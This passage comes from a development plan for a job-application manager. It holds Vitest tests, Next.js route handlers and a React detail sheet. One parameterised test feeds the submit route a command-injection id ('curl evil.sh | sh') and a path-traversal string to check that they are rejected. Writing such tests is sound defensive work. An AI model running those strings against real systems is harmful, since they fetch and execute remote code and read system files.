  createClient: vi.fn(() => ({ rpc: mockRpc })),
}));

beforeEach(() => {
  vi.stubEnv("GITHUB_DISPATCH_TOKEN", "test-token");
  vi.stubGlobal("fetch", vi.fn(() => Promise.resolve({ ok: true, status: 204 } as Response)));
  mockRpc.mockReset();
  // Both approve_application and reset_approval resolve successfully by default; individual
  // tests override with mockImplementationOnce / mockResolvedValueOnce as needed. Keeping this
  // as a single shared mock (rather than one per RPC name) matches how the real supabase-js
  // client exposes one .rpc() method for every function.
  mockRpc.mockImplementation((fn: string) => {
    if (fn === "approve_application") return Promise.resolve({ data: null, error: null });
    if (fn === "reset_approval") return Promise.resolve({ data: null, error: null });
    return Promise.resolve({ data: null, error: null });
  });
});

function makeRequest(idInPath = "5") {
  return new Request(`http://localhost/api/applications/${idInPath}/submit`, { method: "POST" });
}

describe("POST /api/applications/[id]/submit", () => {
  it("calls the approve_application RPC before dispatching", async () => {
    const res = await POST(makeRequest(), { params: Promise.resolve({ id: "5" }) });
    expect(res.status).toBe(200);
    expect(mockRpc).toHaveBeenCalledWith("approve_application", { p_id: 5 });
    expect(global.fetch).toHaveBeenCalled();
    // C3: a successful dispatch must never touch the recovery path.
    expect(mockRpc).not.toHaveBeenCalledWith("reset_approval", expect.anything());
  });

  it("dispatches the apply_agent_submit workflow with the application id", async () => {
    const res = await POST(makeRequest(), { params: Promise.resolve({ id: "5" }) });
    expect(res.status).toBe(200);
    const [url, options] = (global.fetch as ReturnType<typeof vi.fn>).mock.calls[0];
    expect(url).toContain("apply_agent_submit.yml/dispatches");
    const body = JSON.parse((options as RequestInit).body as string);
    expect(body.inputs.application_id).toBe("5");
  });

  it("returns 409 and does not dispatch when the RPC rejects the row", async () => {
    mockRpc.mockResolvedValue({
      data: null,
      error: { message: "approve_application: row 5 is not in an approvable state" },
    });
    const res = await POST(makeRequest(), { params: Promise.resolve({ id: "5" }) });
    expect(res.status).toBe(409);
    const body = await res.json();
    expect(body.error).toContain("not in an approvable state");
    expect(global.fetch).not.toHaveBeenCalled();
  });

  it("returns 502 and calls reset_approval when GitHub dispatch fails (C3 -- a failed dispatch must not permanently brick the row)", async () => {
    vi.stubGlobal("fetch", vi.fn(() => Promise.resolve({ ok: false, status: 500 } as Response)));
    const res = await POST(makeRequest(), { params: Promise.resolve({ id: "5" }) });
    expect(res.status).toBe(502);
    expect(mockRpc).toHaveBeenCalledWith("approve_application", { p_id: 5 });
    expect(mockRpc).toHaveBeenCalledWith("reset_approval", { p_id: 5 });
  });

  it("returns 502 and calls reset_approval when the fetch call itself throws (network-level failure, not just a non-ok response)", async () => {
    vi.stubGlobal("fetch", vi.fn(() => Promise.reject(new Error("network down"))));
    const res = await POST(makeRequest(), { params: Promise.resolve({ id: "5" }) });
    expect(res.status).toBe(502);
    expect(mockRpc).toHaveBeenCalledWith("reset_approval", { p_id: 5 });
  });

  // This id lands in the environment of the one workflow that sets APPLY_AGENT_ARMED=1.
  // A non-numeric value has no legitimate use, so reject it before it ever gets dispatched
  // -- and before the RPC is even called.
  it.each([
    ['1"; curl evil.sh | sh; "', "shell metacharacters"],
    ["../../etc/passwd", "path traversal"],
    ["", "empty"],
    ["5abc", "trailing garbage"],
  ])("rejects a non-numeric id (%s) without dispatching or calling the RPC", async (badId) => {
    const res = await POST(makeRequest(badId), { params: Promise.resolve({ id: badId }) });
    expect(res.status).toBe(400);
    expect(global.fetch).not.toHaveBeenCalled();
    expect(mockRpc).not.toHaveBeenCalled();
  });

  it("returns 500 when GITHUB_DISPATCH_TOKEN is missing, without dispatching or calling the RPC", async () => {
    vi.stubEnv("GITHUB_DISPATCH_TOKEN", "");
    const res = await POST(makeRequest(), { params: Promise.resolve({ id: "5" }) });
    expect(res.status).toBe(500);
    expect(global.fetch).not.toHaveBeenCalled();
    expect(mockRpc).not.toHaveBeenCalled();
  });
});
```

- [ ] **Step 9: Run the test, verify it fails**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx vitest run src/app/api/applications/[id]/submit/route.test.ts`
Expected: FAIL on the `"calls the approve_application RPC..."`, `"returns 409..."`, and both `"...calls reset_approval..."` tests — the current route never calls `supabase.rpc(...)` at all, and `@supabase/supabase-js` isn't even imported by the route yet, so `mockRpc` is never invoked and every assertion on it fails.

- [ ] **Step 10: Implement — rewrite `[id]/submit/route.ts`**

```ts
export const runtime = "nodejs";

import { createClient } from "@supabase/supabase-js";

function getClient() {
  return createClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
  );
}

export async function POST(req: Request, { params }: { params: Promise<{ id: string }> }) {
  const { id } = await params;

  // job_applications.id is an INTEGER. Reject anything else before it reaches the
  // armed workflow -- this id ends up in that job's environment, so a non-numeric
  // value has no legitimate use here.
  if (!/^\d+$/.test(id)) {
    return Response.json({ error: "Invalid application id" }, { status: 400 });
  }

  const token = process.env.GITHUB_DISPATCH_TOKEN;
  if (!token) {
    return Response.json(
      { error: "GITHUB_DISPATCH_TOKEN is not configured" },
      { status: 500 }
    );
  }

  // approve_application is a SECURITY DEFINER RPC -- it is the only way approved_at can ever
  // be set (the anon key's table-level UPDATE grant excludes that column -- see migration
  // 20260925000000). It also re-checks stage/apply_preview server-side, closing the gap where
  // this route previously dispatched the ARMED workflow for any numeric id with no check that
  // the row was actually submittable. IMPORTANT: supabase-js RPC calls do NOT throw on a
  // Postgres exception -- the error comes back on the `error` field of the resolved value, so
  // it must be checked explicitly here, not caught with try/catch.
  const supabase = getClient();
  const { error: rpcError } = await supabase.rpc("approve_application", { p_id: Number(id) });
  if (rpcError) {
    return Response.json({ error: rpcError.message }, { status: 409 });
  }

  // C3: approve_application already set approved_at above. If the dispatch below fails --
  // either GitHub returns a non-ok response, or the fetch call itself throws (network outage,
  // DNS failure, etc.) -- approved_at would otherwise stay set forever with no role able to
  // clear it (it's excluded from anon's UPDATE grant), and every retry would just 409 against
  // approve_application's own already-approved guard. reset_approval is the recovery path for
  // exactly this case; it's guarded server-side to only clear a still-ready_to_submit row, so
  // calling it here can never un-approve a row that actually went on to submit successfully.
  let res: Response;
  try {
    res = await fetch(
      "https://api.github.com/repos/kishoretheeraj/cold-emailing-agent/actions/workflows/apply_agent_submit.yml/dispatches",
      {
        method: "POST",
        headers: {
          Authorization: `Bearer ${token}`,
          Accept: "application/vnd.github+json",
          "X-GitHub-Api-Version": "2022-11-28",
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ ref: "main", inputs: { application_id: id } }),
      }
    );
  } catch (err) {
    await supabase.rpc("reset_approval", { p_id: Number(id) });
    return Response.json(
      { error: "Failed to trigger submit workflow", detail: String(err) },
      { status: 502 }
    );
  }

  if (!res.ok) {
    // Surface GitHub's own reason -- a bare 502 makes a real dispatch failure undebuggable.
    // Guarded: the error path must never itself throw.
    let detail = "";
    try {
      detail = await res.text();
    } catch {
      detail = "";
    }
    await supabase.rpc("reset_approval", { p_id: Number(id) });
    return Response.json(
      { error: "Failed to trigger submit workflow", detail },
      { status: 502 }
    );
  }
  return Response.json({ ok: true });
}
```

- [ ] **Step 11: Run the test, verify it passes**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx vitest run src/app/api/applications/[id]/submit/route.test.ts`
Expected: all tests PASS.

- [ ] **Step 12: Run the full vitest suite and the typecheck**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npm test`
Expected: 0 failures (existing suite plus the new tests above).

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx tsc --noEmit`
Expected: no type errors (confirms Step 1's type change and every field it added compile cleanly).

- [ ] **Step 13: Commit**

```bash
cd /Users/kishoretheeraj/Documents/cold-email-agent && git add contact-manager/src/lib/types.ts contact-manager/src/app/api/applications/[id]/route.ts contact-manager/src/app/api/applications/[id]/route.test.ts contact-manager/src/app/api/applications/[id]/submit/route.ts contact-manager/src/app/api/applications/[id]/submit/route.test.ts && git commit -m "$(cat <<'EOF'
fix: ready_to_submit PATCH bug, editable apply_preview, RPC-gated submit

U10: [id]/route.ts had its own stale, locally-hardcoded stage array
missing ready_to_submit -- import the shared JOB_APPLICATION_STAGES
constant instead of drifting a second copy.

U11 (backend half): PATCH now accepts an optional apply_preview field,
validated for shape, so an edited screening/eligibility answer in the
review UI can actually be saved.

U4/U5 (backend half): the submit route now calls the approve_application
RPC before dispatching apply_agent_submit.yml and returns 409 (never
dispatching) when the row isn't in an approvable state -- closing the
gap where any numeric id reaching this route triggered the ARMED
workflow with no server-side check. If the dispatch itself then fails
(a non-ok response or the fetch call throwing), the route calls the
reset_approval RPC before returning 502, so a failed dispatch can never
permanently brick a row behind an approved_at that nothing can clear.

Co-Authored-By: Claude Sonnet 5 <noreply@anthropic.com>
Claude-Session: https://claude.ai/code/session_016LHvBT9KJnAoXtWu6UyBNH
EOF
)"
```

---

### Task 3: `ApplicationDetailSheet.tsx` skeleton + job/resume sections (U1/U2) + signed-URL route

**Files:**
- Create: `contact-manager/src/app/api/applications/[id]/files/route.ts`
- Create: `contact-manager/src/app/api/applications/[id]/files/route.test.ts`
- Create: `contact-manager/src/components/ApplicationDetailSheet.tsx`
- Create: `contact-manager/src/components/ApplicationDetailSheet.test.tsx`
- Modify: `contact-manager/src/components/ApplicationsPage.tsx`
- Modify: `contact-manager/src/components/ApplicationsPage.test.tsx`
- Modify: `contact-manager/tests/e2e/18-applications.spec.ts`

**Interfaces:**
- Consumes: `JobApplication` type from Task 2 (all new fields present).
- Produces: `ApplicationDetailSheet` component, `{ application: JobApplication | null; onClose: () => void }`. `GET /api/applications/[id]/files` returns `{ resume_url: string | null, cover_letter_url: string | null }`. `ApplicationsPage.tsx` gains `selectedApplication` state and a "View" button per row — Tasks 4 and 5 extend the sheet's contents, not its wiring.

- [ ] **Step 1: Write the failing tests for the signed-URL route**

`contact-manager/src/app/api/applications/[id]/files/route.test.ts`:

```ts
import { describe, it, expect, vi, beforeEach } from "vitest";
import { GET } from "./route";

const mockSingle = vi.fn();
const mockEq = vi.fn();
const mockSelect = vi.fn();
const mockFrom = vi.fn();
const mockCreateSignedUrl = vi.fn();

vi.mock("@supabase/supabase-js", () => ({
  createClient: vi.fn(() => ({
    from: mockFrom,
    storage: { from: vi.fn(() => ({ createSignedUrl: mockCreateSignedUrl })) },
  })),
}));

function params(id: string) {
  return { params: Promise.resolve({ id }) };
}

beforeEach(() => {
  vi.clearAllMocks();
  mockSingle.mockResolvedValue({
    data: { resume_file_ref: "resumes/5/resume.pdf", cover_letter_file_ref: "resumes/5/cl.pdf" },
    error: null,
  });
  mockSelect.mockReturnValue({ eq: mockEq });
  mockEq.mockReturnValue({ single: mockSingle });
  mockFrom.mockReturnValue({ select: mockSelect });
  mockCreateSignedUrl.mockResolvedValue({ data: { signedUrl: "https://signed.example/x" }, error: null });
});

describe("GET /api/applications/[id]/files", () => {
  it("returns signed urls for both files when both refs are present", async () => {
    const res = await GET(new Request("http://test"), params("5"));
    const body = await res.json();
    expect(body.resume_url).toBe("https://signed.example/x");
    expect(body.cover_letter_url).toBe("https://signed.example/x");
    expect(body.resume_error).toBe(false);
    expect(body.cover_letter_error).toBe(false);
    expect(mockCreateSignedUrl).toHaveBeenCalledWith("resumes/5/resume.pdf", 300);
    expect(mockCreateSignedUrl).toHaveBeenCalledWith("resumes/5/cl.pdf", 300);
  });

  it("returns null (not an error) for a missing ref instead of calling createSignedUrl", async () => {
    mockSingle.mockResolvedValue({
      data: { resume_file_ref: null, cover_letter_file_ref: null },
      error: null,
    });
    const res = await GET(new Request("http://test"), params("5"));
    const body = await res.json();
    expect(body.resume_url).toBeNull();
    expect(body.cover_letter_url).toBeNull();
    expect(body.resume_error).toBe(false);
    expect(body.cover_letter_error).toBe(false);
    expect(mockCreateSignedUrl).not.toHaveBeenCalled();
  });

  it("returns an error flag (I11 -- distinct from a missing ref) when signing fails", async () => {
    mockCreateSignedUrl.mockResolvedValue({ data: null, error: new Error("storage unavailable") });
    const res = await GET(new Request("http://test"), params("5"));
    const body = await res.json();
    expect(body.resume_url).toBeNull();
    expect(body.resume_error).toBe(true);
    expect(body.cover_letter_url).toBeNull();
    expect(body.cover_letter_error).toBe(true);
  });

  it("rejects a non-numeric id", async () => {
    const res = await GET(new Request("http://test"), params("abc"));
    expect(res.status).toBe(400);
  });

  it("returns 500 on a supabase read error", async () => {
    mockSingle.mockResolvedValue({ data: null, error: new Error("db down") });
    const res = await GET(new Request("http://test"), params("5"));
    expect(res.status).toBe(500);
  });
});
```

- [ ] **Step 2: Run the test, verify it fails**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx vitest run src/app/api/applications/[id]/files/route.test.ts`
Expected: FAIL — `./route` doesn't exist yet.

- [ ] **Step 3: Implement `[id]/files/route.ts`**

```ts
export const runtime = "nodejs";

import { createClient } from "@supabase/supabase-js";

function getClient() {
  return createClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
  );
}

const SIGNED_URL_EXPIRY_SECONDS = 300;

// I11: a missing file ref and a transient signing failure are different situations and must
// never be conflated -- "no file exists" is a normal, expected state; "couldn't sign it right
// now" means a resume may genuinely exist but the sheet would otherwise wrongly claim it
// doesn't, on the one screen whose entire purpose is reviewing that resume before a real
// submission. This discriminated result is the internal representation; toFileFields() below
// maps it onto the JSON response's existing resume_url/cover_letter_url shape plus a new
// _error flag, so every other task's `/files` mocks (which only ever set the url fields) keep
// working unchanged -- they just implicitly mean "no error".
type SignResult = { status: "ok"; url: string } | { status: "missing" } | { status: "error" };

async function signIfPresent(
  supabase: ReturnType<typeof getClient>,
  path: string | null
): Promise<SignResult> {
  if (!path) return { status: "missing" };
  const { data, error } = await supabase.storage
    .from("resumes")
    .createSignedUrl(path, SIGNED_URL_EXPIRY_SECONDS);
  if (error || !data) return { status: "error" };
  return { status: "ok", url: data.signedUrl };
}

function toFileFields(result: SignResult) {
  return {
    url: result.status === "ok" ? result.url : null,
    error: result.status === "error",
  };
}

export async function GET(req: Request, { params }: { params: Promise<{ id: string }> }) {
  const { id } = await params;
  if (!/^\d+$/.test(id)) {
    return Response.json({ error: "Invalid application id" }, { status: 400 });
  }

  try {
    const supabase = getClient();
    const { data, error } = await supabase
      .from("job_applications")
      .select("resume_file_ref, cover_letter_file_ref")
      .eq("id", Number(id))
      .single();
    if (error) throw error;

    const [resume, coverLetter] = await Promise.all([
      signIfPresent(supabase, data?.resume_file_ref ?? null),
      signIfPresent(supabase, data?.cover_letter_file_ref ?? null),
    ]);
    const resumeFields = toFileFields(resume);
    const coverLetterFields = toFileFields(coverLetter);

    return Response.json({
      resume_url: resumeFields.url,
      resume_error: resumeFields.error,
      cover_letter_url: coverLetterFields.url,
      cover_letter_error: coverLetterFields.error,
    });
  } catch (err) {
    return Response.json({ error: String(err) }, { status: 500 });
  }
}
```

- [ ] **Step 4: Run the test, verify it passes**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx vitest run src/app/api/applications/[id]/files/route.test.ts`
Expected: all 6 tests PASS.

- [ ] **Step 5: Write the failing tests for `ApplicationDetailSheet.tsx`**

`contact-manager/src/components/ApplicationDetailSheet.test.tsx`:

```tsx
import { describe, it, expect, vi, beforeEach } from "vitest";
import { render, screen, waitFor } from "@testing-library/react";
import { ApplicationDetailSheet } from "./ApplicationDetailSheet";
import type { JobApplication } from "@/lib/types";

vi.mock("vaul", () => ({
  Drawer: {
    Root: ({ children, open }: { children: React.ReactNode; open?: boolean }) =>
      open ? <>{children}</> : null,
    Portal: ({ children }: { children: React.ReactNode }) => <>{children}</>,
    Overlay: () => <div />,
    Content: ({ children }: { children: React.ReactNode }) => (
      <div role="dialog" data-testid="sheet-content">{children}</div>
    ),
    Trigger: ({ children }: { children: React.ReactNode }) => <>{children}</>,
    Close: ({
      children,
      onClick,
      "aria-label": ariaLabel,
    }: {
      children?: React.ReactNode;
      onClick?: () => void;
      "aria-label"?: string;
    }) => (
      <button type="button" onClick={onClick} aria-label={ariaLabel}>
        {children}
      </button>
    ),
    Title: ({ children }: { children: React.ReactNode }) => <h2>{children}</h2>,
    Description: ({ children }: { children: React.ReactNode }) => <p>{children}</p>,
  },
}));

const baseApplication: JobApplication = {
  id: "5",
  contact_id: null,
  company: "Ashby Co",
  role: "PM",
  job_url: "https://jobs.example/5",
  source: "jobright",
  source_channel: null,
  stage: "ready_to_submit",
  applied_date: null,
  notes: null,
  posting_snapshot: { description: "Build things.", location: "Remote" },
  resume_file_ref: "resumes/5/resume.pdf",
  cover_letter_file_ref: null,
  resume_cost_usd: null,
  resume_tokens_input: null,
  resume_tokens_output: null,
  pick_verdict: "strong",
  pick_score: 0.9,
  pick_reasoning: "Great fit.",
  apply_preview: {
    platform: "ashby",
    field_values: {},
    eligibility_answers: {},
    screening_answers: {},
  },
  apply_blocked_reason: null,
  approved_at: null,
  created_at: "2026-08-30T00:00:00Z",
  updated_at: "2026-08-30T00:00:00Z",
};

beforeEach(() => {
  vi.stubGlobal(
    "fetch",
    vi.fn(() =>
      Promise.resolve({
        ok: true,
        json: async () => ({
          resume_url: "https://signed.example/resume.pdf",
          resume_error: false,
          cover_letter_url: null,
          cover_letter_error: false,
        }),
      } as Response)
    )
  );
});

describe("ApplicationDetailSheet", () => {
  it("renders nothing when application is null", () => {
    render(<ApplicationDetailSheet application={null} onClose={() => {}} />);
    expect(screen.queryByTestId("sheet-content")).not.toBeInTheDocument();
  });

  it("renders the job url and posting_snapshot fields, including location", async () => {
    render(<ApplicationDetailSheet application={baseApplication} onClose={() => {}} />);
    expect(screen.getByText("https://jobs.example/5")).toBeInTheDocument();
    expect(screen.getByText("Build things.")).toBeInTheDocument();
    expect(screen.getByText("Remote")).toBeInTheDocument();
  });

  it("renders the resume iframe once the signed url loads", async () => {
    render(<ApplicationDetailSheet application={baseApplication} onClose={() => {}} />);
    await waitFor(() => {
      expect(screen.getByTitle("Resume")).toHaveAttribute("src", "https://signed.example/resume.pdf");
    });
  });

  it("shows a fallback message when a file ref is missing", async () => {
    render(<ApplicationDetailSheet application={baseApplication} onClose={() => {}} />);
    await waitFor(() => {
      expect(screen.getByText("No cover letter on file yet.")).toBeInTheDocument();
    });
  });

  it("fetches files for the given application id", async () => {
    render(<ApplicationDetailSheet application={baseApplication} onClose={() => {}} />);
    await waitFor(() => {
      expect(global.fetch).toHaveBeenCalledWith("/api/applications/5/files");
    });
  });

  it("shows a fallback message when no job url is present", () => {
    render(
      <ApplicationDetailSheet application={{ ...baseApplication, job_url: null }} onClose={() => {}} />
    );
    expect(screen.getByText("No job URL on file.")).toBeInTheDocument();
  });

  it("shows a distinct error state (I11) when signing the resume fails, never conflated with 'no file on record'", async () => {
    vi.stubGlobal(
      "fetch",
      vi.fn(() =>
        Promise.resolve({
          ok: true,
          json: async () => ({
            resume_url: null,
            resume_error: true,
            cover_letter_url: null,
            cover_letter_error: false,
          }),
        } as Response)
      )
    );
    render(<ApplicationDetailSheet application={baseApplication} onClose={() => {}} />);
    await waitFor(() => {
      expect(screen.getByText(/couldn't load.*resume/i)).toBeInTheDocument();
    });
    expect(screen.queryByText("No resume on file yet.")).not.toBeInTheDocument();
    // The cover letter ref is genuinely absent on baseApplication -- that must still render
    // the ordinary "missing" copy, not the error copy, confirming the two states don't bleed.
    expect(screen.getByText("No cover letter on file yet.")).toBeInTheDocument();
  });

  it("renders an array-valued posting_snapshot field as a list instead of dropping it (M13)", () => {
    render(
      <ApplicationDetailSheet
        application={{
          ...baseApplication,
          posting_snapshot: {
            description: "Build things.",
            location: "Remote",
            responsibilities: ["Own the roadmap.", "Ship weekly."],
          },
        }}
        onClose={() => {}}
      />
    );
    expect(screen.getByText("Own the roadmap.")).toBeInTheDocument();
    expect(screen.getByText("Ship weekly.")).toBeInTheDocument();
  });
});
```

- [ ] **Step 6: Run the test, verify it fails**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx vitest run src/components/ApplicationDetailSheet.test.tsx`
Expected: FAIL — `./ApplicationDetailSheet` doesn't exist yet.

- [ ] **Step 7: Implement `ApplicationDetailSheet.tsx`**

```tsx
"use client";

import { useEffect, useState } from "react";
import {
  Sheet,
  SheetContent,
  SheetHeader,
  SheetTitle,
  SheetBody,
  SheetClose,
} from "@/components/ui/Sheet";
import type { JobApplication } from "@/lib/types";

type Files = {
  resume_url: string | null;
  resume_error: boolean;
  cover_letter_url: string | null;
  cover_letter_error: boolean;
};

const SNAPSHOT_TEXT_FIELDS = [
  ["description", "Description"],
  ["responsibilities", "Responsibilities"],
  ["qualifications", "Qualifications"],
  ["benefits", "Benefits"],
  ["location", "Location"],
] as const;

// M13: job_discovery.py/jobright.py can store a snapshot field as an array (e.g.
// responsibilities as a list of bullet strings), not just a plain string. A string-only reader
// would silently drop these fields for postings sourced that way -- render an array as a
// newline-joined block (each entry on its own line) instead of hiding it.
function snapshotText(snapshot: Record<string, unknown> | null, key: string): string | null {
  if (!snapshot) return null;
  const v = snapshot[key];
  if (typeof v === "string" && v.trim()) return v;
  if (Array.isArray(v)) {
    const lines = v.filter((item): item is string => typeof item === "string" && item.trim() !== "");
    return lines.length > 0 ? lines.join("\n") : null;
  }
  return null;
}

export function ApplicationDetailSheet({
  application,
  onClose,
}: {
  application: JobApplication | null;
  onClose: () => void;
}) {
  const EMPTY_FILES: Files = {
    resume_url: null,
    resume_error: false,
    cover_letter_url: null,
    cover_letter_error: false,
  };
  const [files, setFiles] = useState<Files>(EMPTY_FILES);
  const [filesLoading, setFilesLoading] = useState(false);

  useEffect(() => {
    if (!application) {
      setFiles(EMPTY_FILES);
      return;
    }
    let cancelled = false;
    setFilesLoading(true);
    fetch(`/api/applications/${application.id}/files`)
      .then((res) => res.json())
      .then((data) => {
        if (!cancelled) {
          setFiles({
            resume_url: data.resume_url ?? null,
            resume_error: data.resume_error ?? false,
            cover_letter_url: data.cover_letter_url ?? null,
            cover_letter_error: data.cover_letter_error ?? false,
          });
        }
      })
      .catch(() => {
        // A network-level failure to even reach /files is itself an error state, not a
        // "no file" state -- I11's distinction applies here too.
        if (!cancelled) setFiles({ ...EMPTY_FILES, resume_error: true, cover_letter_error: true });
      })
      .finally(() => {
        if (!cancelled) setFilesLoading(false);
      });
    return () => {
      cancelled = true;
    };
    // M11: intentionally keyed on application?.id only, not the whole `application` object --
    // I7's onSaved gives the parent a new application object reference on every answer save,
    // and this effect must NOT re-fetch signed file URLs just because apply_preview text
    // changed. react-hooks/exhaustive-deps would otherwise flag this; suppress with a reason
    // rather than widen the dependency array and reintroduce the wasteful refetch.
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [application?.id]);

  return (
    <Sheet open={application !== null} onOpenChange={(o) => !o && onClose()}>
      <SheetContent>
        {application && (
          <>
            <SheetHeader>
              <SheetTitle>
                {application.company} -- {application.role}
              </SheetTitle>
              <SheetClose onClick={onClose} />
            </SheetHeader>
            <SheetBody>
              <div className="flex flex-col gap-6">
                <section>
                  <h3 className="text-sm font-medium text-fg mb-2">Job</h3>
                  {application.job_url ? (
                    <a
                      href={application.job_url}
                      target="_blank"
                      rel="noreferrer"
                      className="text-indigo-400 text-sm underline break-all"
                    >
                      {application.job_url}
                    </a>
                  ) : (
                    <p className="text-fg-dim text-sm">No job URL on file.</p>
                  )}
                  <div className="flex flex-col gap-3 mt-3">
                    {SNAPSHOT_TEXT_FIELDS.map(([key, label]) => {
                      const text = snapshotText(application.posting_snapshot, key);
                      if (!text) return null;
                      return (
                        <div key={key}>
                          <p className="text-xs text-fg-dim uppercase tracking-wide">{label}</p>
                          <p className="text-sm text-fg-muted whitespace-pre-wrap">{text}</p>
                        </div>
                      );
                    })}
                  </div>
                </section>

                <section>
                  <h3 className="text-sm font-medium text-fg mb-2">Resume</h3>
                  {filesLoading ? (
                    <p className="text-fg-dim text-sm">Loading...</p>
                  ) : files.resume_error ? (
                    <p className="text-red-400 text-sm">Couldn't load your resume -- try again.</p>
                  ) : files.resume_url ? (
                    <iframe
                      title="Resume"
                      src={files.resume_url}
                      className="w-full h-64 border border-border rounded-md"
                    />
                  ) : (
                    <p className="text-fg-dim text-sm">No resume on file yet.</p>
                  )}
                </section>

                <section>
                  <h3 className="text-sm font-medium text-fg mb-2">Cover letter</h3>
                  {filesLoading ? (
                    <p className="text-fg-dim text-sm">Loading...</p>
                  ) : files.cover_letter_error ? (
                    <p className="text-red-400 text-sm">Couldn't load your cover letter -- try again.</p>
                  ) : files.cover_letter_url ? (
                    <iframe
                      title="Cover letter"
                      src={files.cover_letter_url}
                      className="w-full h-64 border border-border rounded-md"
                    />
                  ) : (
                    <p className="text-fg-dim text-sm">No cover letter on file yet.</p>
                  )}
                </section>
              </div>
            </SheetBody>
          </>
        )}
      </SheetContent>
    </Sheet>
  );
}
```

- [ ] **Step 8: Run the test, verify it passes**

Run: `cd /Users/kishoretheeraj/Documents/cold-email-agent/contact-manager && npx vitest run src/components/ApplicationDetailSheet.test.tsx`
Expected: all 8 tests PASS.

- [ ] **Step 9: Write the failing test for wiring the sheet into `ApplicationsPage.tsx`**

`contact-manager/src/components/ApplicationsPage.test.tsx` — add the `vaul` mock (same shape as Step 5 above) near the top, right after the existing `Tooltip` mock, and change the `beforeEach` fetch stub to branch on the `/files` URL. Full replacement of the top of the file through `beforeEach` (everything from the imports through the end of `beforeEach`, leaving the two `describe` blocks below untouched for now):

```tsx
import { describe, it, expect, vi, beforeEach } from "vitest";
import { render, screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { ApplicationsPage } from "./ApplicationsPage";

vi.mock("@/components/ui/Tooltip", () => ({
  Tooltip: ({ children }: { children: React.ReactNode }) => <>{children}</>,
}));

vi.mock("vaul", () => ({
  Drawer: {
    Root: ({ children, open }: { children: React.ReactNode; open?: boolean }) =>
      open ? <>{children}</> : null,
    Portal: ({ children }: { children: React.ReactNode }) => <>{children}</>,
    Overlay: () => <div />,
    Content: ({ children }: { children: React.ReactNode }) => (
      <div role="dialog" data-testid="sheet-content">{children}</div>
    ),
    Trigger: ({ children }: { children: React.ReactNode }) => <>{children}</>,
    Close: ({
      children,
      onClick,
      "aria-label": ariaLabel,
    }: {
      children?: React.ReactNode;
      onClick?: () => void;
      "aria-label"?: string;
    }) => (
      <button type="button" onClick={onClick} aria-label={ariaLabel}>
        {children}
      </button>
    ),
    Title: ({ children }: { children: React.ReactNode }) => <h2>{children}</h2>,
    Description: ({ children }: { children: React.ReactNode }) => <p>{children}</p>,
  },
}));

const toastErrorMock = vi.fn();
const toastSuccessMock = vi.fn();
vi.mock("sonner", () => ({
  toast: {
    error: (...args: unknown[]) => toastErrorMock(...args),
    success: (...args: unknown[]) => toastSuccessMock(...args),
  },
}));

// I12: every fixture below includes the full JobApplication field set (source_channel,
// resume_cost_usd/resume_tokens_input/resume_tokens_output, approved_at) with plausible
// null/default values -- an earlier draft of this plan's Self-Review claimed this was already
// true and it wasn't. Harmless at runtime either way (the fetch mock is untyped), but keeping
// these complete avoids the fixtures silently drifting from the real JobApplication shape.
const sampleApplications = [
  { id: "1", contact_id: null, company: "Acme", role: "PM", job_url: null, source: "manual",
    source_channel: null, stage: "saved", applied_date: null, notes: null, posting_snapshot: null,
    resume_file_ref: null, cover_letter_file_ref: null,
    resume_cost_usd: null, resume_tokens_input: null, resume_tokens_output: null,
    pick_verdict: null, pick_score: null, pick_reasoning: null,
    apply_preview: null, apply_blocked_reason: null, approved_at: null,
    created_at: "2026-08-26T00:00:00Z", updated_at: "2026-08-26T00:00:00Z" },
  { id: "2", contact_id: null, company: "Globex", role: "Eng", job_url: null, source: "manual",
    source_channel: null, stage: "applied", applied_date: "2026-08-20", notes: null, posting_snapshot: null,
    resume_file_ref: null, cover_letter_file_ref: null,
    resume_cost_usd: null, resume_tokens_input: null, resume_tokens_output: null,
    pick_verdict: null, pick_score: null, pick_reasoning: null,
    apply_preview: null, apply_blocked_reason: null, approved_at: null,
    created_at: "2026-08-20T00:00:00Z", updated_at: "2026-08-20T00:00:00Z" },
];

const pickedApplication = {
  id: "3", contact_id: null, company: "LangChain", role: "PM", job_url: null, source: "jobright",
  source_channel: null, stage: "saved", applied_date: null, notes: null, posting_snapshot: null,
  resume_file_ref: null, cover_letter_file_ref: null,
  resume_cost_usd: null, resume_tokens_input: null, resume_tokens_output: null,
  pick_verdict: "strong", pick_score: 0.82, pick_reasoning: "Direct title match.",
  apply_preview: null, apply_blocked_reason: null, approved_at: null,
  created_at: "2026-08-30T00:00:00Z", updated_at: "2026-08-30T00:00:00Z",
};
const blockedApplication = {
  id: "4", contact_id: null, company: "Starz", role: "PM", job_url: null, source: "jobright",
  source_channel: null, stage: "saved", applied_date: null, notes: null, posting_snapshot: null,
  resume_file_ref: null, cover_letter_file_ref: null,
  resume_cost_usd: null, resume_tokens_input: null, resume_tokens_output: null,
  pick_verdict: null, pick_score: null, pick_reasoning: null,
  apply_preview: null, apply_blocked_reason: "workday -- permanently excluded", approved_at: null,
  created_at: "2026-08-30T00:00:00Z", updated_at: "2026-08-30T00:00:00Z",
};
const readyApplication = {
  id: "5", contact_id: null, company: "Ashby Co", role: "PM", job_url: "https://jobs.example/5",
  source: "jobright", source_channel: "ashby",
  stage: "ready_to_submit", applied_date: null, notes: null,
  posting_snapshot: { description: "Own the roadmap.", location: "Remote" },
  resume_file_ref: "resumes/5/resume.pdf", cover_letter_file_ref: "resumes/5/cl.pdf",
  pick_verdict: "strong", pick_score: 0.9, pick_reasoning: "Great fit.",
  apply_preview: { platform: "ashby", field_values: { name: "Kishore" }, eligibility_answers: {}, screening_answers: { "Why this role?": "Because of the mission." } },
  apply_blocked_reason: null,
